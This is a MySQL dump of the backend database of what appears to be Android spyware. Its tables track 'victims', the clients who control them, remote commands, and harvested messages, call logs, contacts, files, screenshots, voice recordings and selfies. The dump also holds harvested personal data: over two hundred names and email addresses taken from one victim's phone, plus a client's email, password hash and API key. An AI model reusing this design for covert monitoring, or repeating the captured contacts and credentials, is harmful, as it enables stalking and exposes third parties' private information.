-- MySQL dump 10.13  Distrib 5.5.47, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: xrob
-- ------------------------------------------------------
-- Server version	5.5.47-0ubuntu0.14.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `calls`
--

DROP TABLE IF EXISTS `calls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `calls` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `phone` varchar(20) NOT NULL,
  `call_type` enum(' IN','OUT','MISSED') NOT NULL,
  `called_at` timestamp NULL DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `calls_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `calls`
--

LOCK TABLES `calls` WRITE;
/*!40000 ALTER TABLE `calls` DISABLE KEYS */;
/*!40000 ALTER TABLE `calls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `client_victim_relations`
--

DROP TABLE IF EXISTS `client_victim_relations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `client_victim_relations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_id` int(11) NOT NULL,
  `victim_id` int(11) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `client_id` (`client_id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `client_victim_relations_ibfk_1` FOREIGN KEY (`client_id`) REFERENCES `clients` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `client_victim_relations_ibfk_2` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `client_victim_relations`
--

LOCK TABLES `client_victim_relations` WRITE;
/*!40000 ALTER TABLE `client_victim_relations` DISABLE KEYS */;
INSERT INTO `client_victim_relations` VALUES (1,1,1,'2016-09-20 18:07:25');
/*!40000 ALTER TABLE `client_victim_relations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `clients`
--

DROP TABLE IF EXISTS `clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `pass_hash` text NOT NULL,
  `api_key` varchar(10) NOT NULL,
  `email` varchar(100) NOT NULL,
  `is_verified_email` tinyint(4) NOT NULL DEFAULT '0',
  `is_premium_client` tinyint(4) NOT NULL DEFAULT '0',
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `client_code` varchar(10) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `api_key` (`api_key`),
  UNIQUE KEY `client_code` (`client_code`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `clients`
--

LOCK TABLES `clients` WRITE;
/*!40000 ALTER TABLE `clients` DISABLE KEYS */;
INSERT INTO `clients` VALUES (1,'testuser','kd0BXTd3E1YabZGWqiTCCQ==','7UosxfrYft','theapache64@gmail.com',0,0,1,'1111111111','2016-09-20 18:05:50');
/*!40000 ALTER TABLE `clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `command_statuses`
--

DROP TABLE IF EXISTS `command_statuses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `command_statuses` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `command_id` int(11) NOT NULL,
  `status` enum('SENT','DELIVERED','FINISHED','FAILED') NOT NULL DEFAULT 'SENT',
  `status_message` text NOT NULL,
  `status_happened_at` varchar(20) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `command_id` (`command_id`),
  CONSTRAINT `command_statuses_ibfk_1` FOREIGN KEY (`command_id`) REFERENCES `commands` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `command_statuses`
--

LOCK TABLES `command_statuses` WRITE;
/*!40000 ALTER TABLE `command_statuses` DISABLE KEYS */;
/*!40000 ALTER TABLE `command_statuses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `commands`
--

DROP TABLE IF EXISTS `commands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `commands` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL,
  `command` text,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `client_id` (`client_id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `commands_ibfk_1` FOREIGN KEY (`client_id`) REFERENCES `clients` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `commands_ibfk_2` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `commands`
--

LOCK TABLES `commands` WRITE;
/*!40000 ALTER TABLE `commands` DISABLE KEYS */;
/*!40000 ALTER TABLE `commands` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `contact_names_audit`
--

DROP TABLE IF EXISTS `contact_names_audit`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `contact_names_audit` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `contact_id` int(11) NOT NULL,
  `name` varchar(100) NOT NULL,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `contact_id` (`contact_id`),
  CONSTRAINT `contact_names_audit_ibfk_1` FOREIGN KEY (`contact_id`) REFERENCES `contacts` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `contact_names_audit`
--

LOCK TABLES `contact_names_audit` WRITE;
/*!40000 ALTER TABLE `contact_names_audit` DISABLE KEYS */;
/*!40000 ALTER TABLE `contact_names_audit` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `contacts`
--

DROP TABLE IF EXISTS `contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `contacts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `android_contact_id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `contacts_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=224 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `contacts`
--

LOCK TABLES `contacts` WRITE;
/*!40000 ALTER TABLE `contacts` DISABLE KEYS */;
INSERT INTO `contacts` VALUES (1,1,2413,'Haris Rainhopes',1,'2016-09-20 18:06:18'),(2,1,2434,'Salman Rainhopes',1,'2016-09-20 18:06:18'),(3,1,3148,'Safeena',1,'2016-09-20 18:06:18'),(4,1,3149,'musammilkt@gmail.com',1,'2016-09-20 18:06:18'),(5,1,3150,'muzammil@rainhopes.com',1,'2016-09-20 18:06:18'),(6,1,3151,'fasil@rdxcompany.com',1,'2016-09-20 18:06:18'),(7,1,3152,'mshuhaib864@gmail.com',1,'2016-09-20 18:06:18'),(8,1,3153,'jeffin@theyounion.in',1,'2016-09-20 18:06:18'),(9,1,3154,'favaz@rainhopes.com',1,'2016-09-20 18:06:18'),(10,1,3155,'aaron',1,'2016-09-20 18:06:18'),(11,1,3157,'shaharban.mt@gmail.com',1,'2016-09-20 18:06:18'),(12,1,3158,'Muzammil',1,'2016-09-20 18:06:18'),(13,1,3159,'Rainhopes',1,'2016-09-20 18:06:18'),(14,1,3160,'jakewharton@gmail.com',1,'2016-09-20 18:06:18'),(15,1,3161,'Smokie',1,'2016-09-20 18:06:18'),(16,1,3162,'mail@rainhopes.com',1,'2016-09-20 18:06:18'),(17,1,3163,'sakkeer@rdxcompany.com',1,'2016-09-20 18:06:18'),(18,1,3164,'sulof@rdxcompany.com',1,'2016-09-20 18:06:18'),(19,1,3165,'thoufeequeaslamk@gmail.com',1,'2016-09-20 18:06:18'),(20,1,3166,'shaharban@rainhopes.com',1,'2016-09-20 18:06:18'),(21,1,3167,'fiyas@rainhopes.com',1,'2016-09-20 18:06:18'),(22,1,3168,'Shuhaib',1,'2016-09-20 18:06:18'),(23,1,3169,'Athira Nair',1,'2016-09-20 18:06:18'),(24,1,3170,'latheeftvpz@gmail.com',1,'2016-09-20 18:06:18'),(25,1,3172,'hisham@rdxcompany.com',1,'2016-09-20 18:06:18'),(26,1,3173,'Faisalbabu Rainhopes',1,'2016-09-20 18:06:18'),(27,1,3174,'Shiyas',1,'2016-09-20 18:06:18'),(28,1,3175,'Dileep MT',1,'2016-09-20 18:06:18'),(29,1,3176,'athiracnair@gmail.com',1,'2016-09-20 18:06:18'),(30,1,3178,'noufal@rdxcompany.com',1,'2016-09-20 18:06:18'),(31,1,3179,'mithun@rdxcompany.com',1,'2016-09-20 18:06:18'),(32,1,3180,'works@rainhopes.com',1,'2016-09-20 18:06:18'),(33,1,3181,'Salam',1,'2016-09-20 18:06:18'),(34,1,3182,'John Doe',1,'2016-09-20 18:06:18'),(35,1,3183,'riyas@rdxcompany.com',1,'2016-09-20 18:06:18'),(36,1,3184,'sajith@rdxcompany.com',1,'2016-09-20 18:06:18'),(37,1,3185,'Latheef',1,'2016-09-20 18:06:18'),(38,1,3186,'axefox6@gmail.com',1,'2016-09-20 18:06:18'),(39,1,3187,'basil@rdxcompany.com',1,'2016-09-20 18:06:19'),(40,1,3190,'Ajish Sir',1,'2016-09-20 18:06:19'),(41,1,3191,'theapache64@gmail.com',1,'2016-09-20 18:06:19'),(42,1,4848,'NASEEBA P K - Hunt',1,'2016-09-20 18:06:19'),(43,1,4850,'BELLA ROSE BABY - Hunt',1,'2016-09-20 18:06:19'),(44,1,5248,'Athira C Nair',1,'2016-09-20 18:06:19'),(45,1,5651,'salih@rainhopes.com',1,'2016-09-20 18:06:19'),(46,1,5658,'vivek zycoz',1,'2016-09-20 18:06:19'),(47,1,5659,'k.lenindas@gmail.com',1,'2016-09-20 18:06:19'),(48,1,5660,'thoufeeque dlits',1,'2016-09-20 18:06:19'),(49,1,5661,'shaheenc198@gmail.com',1,'2016-09-20 18:06:19'),(50,1,5662,'clodhi6@gmail.com',1,'2016-09-20 18:06:19'),(51,1,5663,'divyasoni631@gmail.com',1,'2016-09-20 18:06:19'),(52,1,5664,'huznuz',1,'2016-09-20 18:06:19'),(53,1,5665,'ssipmna@gmail.com',1,'2016-09-20 18:06:19'),(54,1,5666,'Himshar',1,'2016-09-20 18:06:19'),(55,1,5667,'Thabsheer',1,'2016-09-20 18:06:19'),(56,1,5668,'ninedhishna@yahoo.in',1,'2016-09-20 18:06:19'),(57,1,5669,'renukhadevi236@gmail.com',1,'2016-09-20 18:06:19'),(58,1,5670,'ask',1,'2016-09-20 18:06:19'),(59,1,5671,'place@cindia.org',1,'2016-09-20 18:06:19'),(60,1,5672,'ranjeetasen35@gmail.com',1,'2016-09-20 18:06:19'),(61,1,5673,'Koroma benita',1,'2016-09-20 18:06:19'),(62,1,5674,'ushagurjar03@gmail.com',1,'2016-09-20 18:06:19'),(63,1,5675,'Career Courses - NIIT',1,'2016-09-20 18:06:19'),(64,1,5676,'admis@cindia.org',1,'2016-09-20 18:06:19'),(65,1,5677,'support@bluestack.com',1,'2016-09-20 18:06:19'),(66,1,5678,'husnu007',1,'2016-09-20 18:06:19'),(67,1,5679,'career@hackney.in',1,'2016-09-20 18:06:19'),(68,1,5680,'apache@ueuo-freewebhostingarea-com.ueuo.com',1,'2016-09-20 18:06:19'),(69,1,5681,'mrp. ckra',1,'2016-09-20 18:06:19'),(70,1,5682,'solutions. ssinet',1,'2016-09-20 18:06:19'),(71,1,5683,'ettysantu',1,'2016-09-20 18:06:19'),(72,1,5684,'busheer@outlook.com',1,'2016-09-20 18:06:19'),(73,1,5685,'alrahiman',1,'2016-09-20 18:06:19'),(74,1,5686,'Kirankannan7',1,'2016-09-20 18:06:19'),(75,1,5687,'lib',1,'2016-09-20 18:06:19'),(76,1,5688,'Flippa Support',1,'2016-09-20 18:06:19'),(77,1,5689,'cac@uoc.ac.in',1,'2016-09-20 18:06:19'),(78,1,5690,'career',1,'2016-09-20 18:06:19'),(79,1,5691,'jenifer. jinny',1,'2016-09-20 18:06:19'),(80,1,5692,'ennuentemoideen',1,'2016-09-20 18:06:20'),(81,1,5693,'rahman@dream2jobs.com',1,'2016-09-20 18:06:20'),(82,1,5694,'worldskillcompetition@aptech.ac.in',1,'2016-09-20 18:06:20'),(83,1,5695,'exam',1,'2016-09-20 18:06:20'),(84,1,5696,'shifar@myblog.hol.es',1,'2016-09-20 18:06:20'),(85,1,5697,'mail@rainhopes.com',1,'2016-09-20 18:06:20'),(86,1,5698,'info@crescenttech.in',1,'2016-09-20 18:06:20'),(87,1,5699,'shifar',1,'2016-09-20 18:06:20'),(88,1,5700,'salmankmp@gmail.com',1,'2016-09-20 18:06:20'),(89,1,5701,'salam@rainhopes.com',1,'2016-09-20 18:06:20'),(90,1,5702,'shuhaib@rainhopes.com',1,'2016-09-20 18:06:20'),(91,1,5703,'Shaffeeq Rainhopes',1,'2016-09-20 18:06:20'),(92,1,5704,'7125533+581mzuwsy2@tickets.cpanel.net',1,'2016-09-20 18:06:20'),(93,1,5705,'sakkeerppd5793@gmail.com',1,'2016-09-20 18:06:20'),(94,1,5706,'cs@flipkart.com',1,'2016-09-20 18:06:20'),(95,1,5707,'me@aaronsw.com',1,'2016-09-20 18:06:20'),(96,1,5708,'appleg...@gmail.com',1,'2016-09-20 18:06:20'),(97,1,5709,'help@snapdeal.com',1,'2016-09-20 18:06:20'),(98,1,5710,'marihshah.sh@gmail.com',1,'2016-09-20 18:06:20'),(99,1,5711,'eng.mostafa.gazar@gmail.com',1,'2016-09-20 18:06:20'),(100,1,5712,'privacy@quora.com',1,'2016-09-20 18:06:20'),(101,1,5713,'Joe',1,'2016-09-20 18:06:20'),(102,1,5714,'fiyasramrodz@outlook.com',1,'2016-09-20 18:06:20'),(103,1,5715,'ajeshmenonpkd@gmail.com',1,'2016-09-20 18:06:20'),(104,1,5716,'shaharban@rainhopes.com',1,'2016-09-20 18:06:20'),(105,1,5717,'9895182634@airtelkol.com',1,'2016-09-20 18:06:20'),(106,1,5718,'customercare@sib.co.in',1,'2016-09-20 18:06:20'),(107,1,5719,'shifashifz.@gmail.com',1,'2016-09-20 18:06:20'),(108,1,5720,'asnad0006@gmail.com',1,'2016-09-20 18:06:20'),(109,1,5721,'admin@kat-technologies.com',1,'2016-09-20 18:06:20'),(110,1,5722,'customersupport@mm.co.in',1,'2016-09-20 18:06:20'),(111,1,5723,'email@kat-technologies.com',1,'2016-09-20 18:06:20'),(112,1,5724,'santhoshgj@mm.co.in',1,'2016-09-20 18:06:20'),(113,1,5725,'muhammed Rahoof',1,'2016-09-20 18:06:20'),(114,1,5726,'Faisal Bosco',1,'2016-09-20 18:06:20'),(115,1,5727,'Abdul Muneer',1,'2016-09-20 18:06:20'),(116,1,5728,'Ravi Tamada',1,'2016-09-20 18:06:20'),(117,1,5729,'sujeesh kuttan',1,'2016-09-20 18:06:20'),(118,1,5730,'Abdul Shukoor',1,'2016-09-20 18:06:20'),(119,1,5731,'Mujeeb Angel',1,'2016-09-20 18:06:20'),(120,1,5732,'Yahiya Mohammed',1,'2016-09-20 18:06:20'),(121,1,5733,'inshad inshu',1,'2016-09-20 18:06:20'),(122,1,5734,'Zaid Hashim Ashi',1,'2016-09-20 18:06:20'),(123,1,5735,'ibanking@sib.co.in',1,'2016-09-20 18:06:20'),(124,1,5736,'info',1,'2016-09-20 18:06:20'),(125,1,5737,'henning.dodenhof@gmail.com',1,'2016-09-20 18:06:20'),(126,1,5738,'Mohamad Sajad',1,'2016-09-20 18:06:20'),(127,1,5739,'Mohamed Shameer',1,'2016-09-20 18:06:21'),(128,1,5740,'ayaan Baby',1,'2016-09-20 18:06:21'),(129,1,5741,'meem888@windowslive.com',1,'2016-09-20 18:06:21'),(130,1,5742,'Mohammad S',1,'2016-09-20 18:06:21'),(131,1,5743,'Frederik Schweiger',1,'2016-09-20 18:06:21'),(132,1,5744,'Msg Advertising',1,'2016-09-20 18:06:21'),(133,1,5745,'Ashik Kodali',1,'2016-09-20 18:06:21'),(134,1,5746,'Luthuf Pandallur',1,'2016-09-20 18:06:21'),(135,1,5747,'ABDUL ADIL M',1,'2016-09-20 18:06:21'),(136,1,5748,'safvan m',1,'2016-09-20 18:06:21'),(137,1,5749,'Muhammed Sharafudheen',1,'2016-09-20 18:06:21'),(138,1,5750,'Ramdhan Choudhary',1,'2016-09-20 18:06:21'),(139,1,5751,'jayakrishnan PM',1,'2016-09-20 18:06:21'),(140,1,5752,'KMSHABEEB KMS',1,'2016-09-20 18:06:21'),(141,1,5753,'Salih Paloli',1,'2016-09-20 18:06:21'),(142,1,5754,'Livin M. Miranda',1,'2016-09-20 18:06:21'),(143,1,5755,'Rahul R Nair',1,'2016-09-20 18:06:21'),(144,1,5756,'mmokhtarabadi@gmail.com',1,'2016-09-20 18:06:21'),(145,1,5757,'Saifu SD',1,'2016-09-20 18:06:21'),(146,1,5758,'Fahad',1,'2016-09-20 18:06:21'),(147,1,5759,'Asad Ummattil',1,'2016-09-20 18:06:21'),(148,1,5760,'Asnad P',1,'2016-09-20 18:06:21'),(149,1,5761,'fiyufiyas@gmail.com',1,'2016-09-20 18:06:21'),(150,1,5762,'SabZ RoZariO',1,'2016-09-20 18:06:21'),(151,1,5763,'ashishkachrola',1,'2016-09-20 18:06:21'),(152,1,5764,'inetconcepts',1,'2016-09-20 18:06:21'),(153,1,5765,'Axe Fox',1,'2016-09-20 18:06:21'),(154,1,5766,'faisal mk',1,'2016-09-20 18:06:21'),(155,1,5767,'rosestudiokpm@gmail.com',1,'2016-09-20 18:06:21'),(156,1,5768,'Muhammed Noufal V T',1,'2016-09-20 18:06:21'),(157,1,5769,'Muhammed Shuhaib',1,'2016-09-20 18:06:21'),(158,1,5770,'Dileep MT',1,'2016-09-20 18:06:21'),(159,1,5771,'Abin ps',1,'2016-09-20 18:06:21'),(160,1,5772,'Salih KP',1,'2016-09-20 18:06:21'),(161,1,5773,'arun k',1,'2016-09-20 18:06:21'),(162,1,5774,'RAMSHEEJA JASMIN K - Hunt',1,'2016-09-20 18:06:21'),(163,1,5775,'sajith@rdxcompany.com',1,'2016-09-20 18:06:21'),(164,1,5776,'Muhammed Busheer',1,'2016-09-20 18:06:21'),(165,1,5777,'noufal@rdxcompany.com',1,'2016-09-20 18:06:21'),(166,1,5778,'ANSHIBA T - Hunt',1,'2016-09-20 18:06:21'),(167,1,5779,'SHIBILA P T - Hunt',1,'2016-09-20 18:06:21'),(168,1,5780,'SHIBILA HARIS - Hunt',1,'2016-09-20 18:06:22'),(169,1,5781,'NAFLA K P - Hunt',1,'2016-09-20 18:06:22'),(170,1,5782,'jobjunglemail@gmail.com',1,'2016-09-20 18:06:22'),(171,1,5783,'9447419191v@gmail.com',1,'2016-09-20 18:06:22'),(172,1,5784,'annishaikh1990@gmail.com',1,'2016-09-20 18:06:22'),(173,1,5785,'shihabs.com@gmail.com',1,'2016-09-20 18:06:22'),(174,1,5786,'ritesh@oravel.com',1,'2016-09-20 18:06:22'),(175,1,5787,'skp19935@gmail.com',1,'2016-09-20 18:06:22'),(176,1,5788,'mithun apm',1,'2016-09-20 18:06:22'),(177,1,5789,'Dharshan Anand',1,'2016-09-20 18:06:22'),(178,1,5790,'tcagokl@yahoo.com',1,'2016-09-20 18:06:22'),(179,1,5791,'shifar. shifz',1,'2016-09-20 18:06:22'),(180,1,5792,'Santosh Setty',1,'2016-09-20 18:06:22'),(181,1,5793,'chris.pirillo@gmail.com',1,'2016-09-20 18:06:22'),(182,1,5794,'Rahul R',1,'2016-09-20 18:06:22'),(183,1,5795,'info@spacesofttechnologies.com',1,'2016-09-20 18:06:22'),(184,1,5796,'mlabeebm619',1,'2016-09-20 18:06:22'),(185,1,5797,'srikanthwebdesigner@gmail.com',1,'2016-09-20 18:06:22'),(186,1,5798,'habil humayun',1,'2016-09-20 18:06:22'),(187,1,5799,'THOUFEEQUE ASLAM',1,'2016-09-20 18:06:22'),(188,1,5800,'mad_dev@linuxmail.org',1,'2016-09-20 18:06:22'),(189,1,5801,'nineexperts@gmail.com',1,'2016-09-20 18:06:22'),(190,1,5802,'ninehtz@gmail.com',1,'2016-09-20 18:06:22'),(191,1,5803,'santhosh.tekuri@gmail.com',1,'2016-09-20 18:06:22'),(192,1,5804,'abdul shameer',1,'2016-09-20 18:06:22'),(193,1,5805,'d.pirngruber@gmail.com',1,'2016-09-20 18:06:22'),(194,1,5806,'mail4shamseer@gmail.com',1,'2016-09-20 18:06:22'),(195,1,5807,'ahmetmermerkaya@gmail.com',1,'2016-09-20 18:06:22'),(196,1,5808,'Quentin Watt',1,'2016-09-20 18:06:22'),(197,1,5809,'Junais66@gmail.com',1,'2016-09-20 18:06:22'),(198,1,5810,'akash.bangad93@gmail.com',1,'2016-09-20 18:06:22'),(199,1,5811,'Robin Dhanwani',1,'2016-09-20 18:06:22'),(200,1,5812,'nived suresh',1,'2016-09-20 18:06:22'),(201,1,5813,'rajeshmenonpkd@gmail.com',1,'2016-09-20 18:06:22'),(202,1,5814,'hardnocks24',1,'2016-09-20 18:06:22'),(203,1,5815,'haris5077@gmail.com',1,'2016-09-20 18:06:22'),(204,1,5816,'Jake Wharton',1,'2016-09-20 18:06:22'),(205,1,5817,'tacticiankerala@gmail.com',1,'2016-09-20 18:06:22'),(206,1,5818,'Shifar Robbins',1,'2016-09-20 18:06:22'),(207,1,5819,'ajish@rainhopes.com',1,'2016-09-20 18:06:22'),(208,1,5820,'sabeelc3@gmail.com',1,'2016-09-20 18:06:22'),(209,1,5821,'Nidal Overseas',1,'2016-09-20 18:06:22'),(210,1,5822,'Shuhaib Pdn',1,'2016-09-20 18:06:22'),(211,1,5823,'2nickpick',1,'2016-09-20 18:06:22'),(212,1,5824,'swati@thehackernews.com',1,'2016-09-20 18:06:23'),(213,1,5825,'printonpmna@gmail.com',1,'2016-09-20 18:06:23'),(214,1,5826,'Shifar Shifz',1,'2016-09-20 18:06:23'),(215,1,5827,'FAHIMA P - Hunt',1,'2016-09-20 18:06:23'),(216,1,5828,'theapache 64',1,'2016-09-20 18:06:23'),(217,1,5829,'Sely Lychee',1,'2016-09-20 18:06:23'),(218,1,5830,'.shifarshifz@gmail.com',1,'2016-09-20 18:06:23'),(219,1,5831,'shifarshifz@gmail.com',1,'2016-09-20 18:06:23'),(220,1,5834,'Sheereen Musthafa',1,'2016-09-20 18:06:23'),(221,1,5835,'mithun.mts@gmail.com',1,'2016-09-20 18:06:23'),(222,1,5940,'Dthhii,h ghhh',1,'2016-09-20 18:06:23'),(223,1,5941,'Buuu hhh',1,'2016-09-20 18:06:23');
/*!40000 ALTER TABLE `contacts` ENABLE KEYS */;
UNLOCK TABLES;
/*!50003 SET @saved_cs_client      = @@character_set_client */ ;
/*!50003 SET @saved_cs_results     = @@character_set_results */ ;
/*!50003 SET @saved_col_connection = @@collation_connection */ ;
/*!50003 SET character_set_client  = utf8 */ ;
/*!50003 SET character_set_results = utf8 */ ;
/*!50003 SET collation_connection  = utf8_general_ci */ ;
/*!50003 SET @saved_sql_mode       = @@sql_mode */ ;
/*!50003 SET sql_mode              = 'STRICT_TRANS_TABLES' */ ;
DELIMITER ;;
/*!50003 CREATE*/ /*!50017 DEFINER=`root`@`localhost`*/ /*!50003 TRIGGER after_contacts_update
AFTER UPDATE ON contacts
FOR EACH ROW BEGIN
  IF OLD.name <> NEW.name
  THEN
    INSERT INTO contact_names_audit
    SET contact_id = OLD.id,
      name         = OLD.name;
  END IF;
END */;;
DELIMITER ;
/*!50003 SET sql_mode              = @saved_sql_mode */ ;
/*!50003 SET character_set_client  = @saved_cs_client */ ;
/*!50003 SET character_set_results = @saved_cs_results */ ;
/*!50003 SET collation_connection  = @saved_col_connection */ ;

--
-- Table structure for table `deliveries`
--

DROP TABLE IF EXISTS `deliveries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `deliveries` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `data_type` enum('messages','command_statuses','call_logs','contacts','files','media_screen_shot','media_voice','media_selfie','join','re_join','other') NOT NULL,
  `error` tinyint(4) NOT NULL,
  `message` text NOT NULL,
  `server_error` tinyint(4) NOT NULL DEFAULT '0',
  `server_error_message` text,
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `deliveries_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `deliveries`
--

LOCK TABLES `deliveries` WRITE;
/*!40000 ALTER TABLE `deliveries` DISABLE KEYS */;
INSERT INTO `deliveries` VALUES (1,1,'join',0,'join',0,NULL,'2016-09-20 18:06:18'),(2,1,'contacts',0,'223 contact(s) retrieved',0,NULL,'2016-09-20 18:06:23'),(3,1,'other',0,'Client connection established with Client-1',0,NULL,'2016-09-20 18:07:25');
/*!40000 ALTER TABLE `deliveries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `file_bundles`
--

DROP TABLE IF EXISTS `file_bundles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `file_bundles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `victim_id` int(11) NOT NULL,
  `bundle_hash` text NOT NULL,
  `is_active` tinyint(4) NOT NULL DEFAULT '1',
  `last_logged_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `victim_id` (`victim_id`),
  CONSTRAINT `file_bundles_ibfk_1` FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `file_bundles`
--

LOCK TABLES `file_bundles` WRITE;
/*!40000 ALTER TABLE `file_bundles` DISABLE KEYS */;
/*!40000 ALTER TABLE `file_bundles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `files`
--

DROP TABLE IF EXISTS `files`;
